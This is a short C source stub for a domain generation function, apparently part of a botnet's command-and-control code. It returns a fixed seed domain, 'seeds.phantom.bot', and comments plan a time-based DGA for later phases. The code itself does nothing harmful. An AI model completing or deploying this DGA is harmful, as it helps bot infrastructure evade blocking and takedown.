#include "dga.h"

// Configurable Seed
#define STATIC_SEED_DOMAIN "seeds.phantom.bot"

char *dga_get_domain(void) {
    // Phase 1.9: Static Return
    // Phase 2+: Implement Time-based DGA here
    // e.g. generate_domain(time(NULL))
    
    return STATIC_SEED_DOMAIN;
}
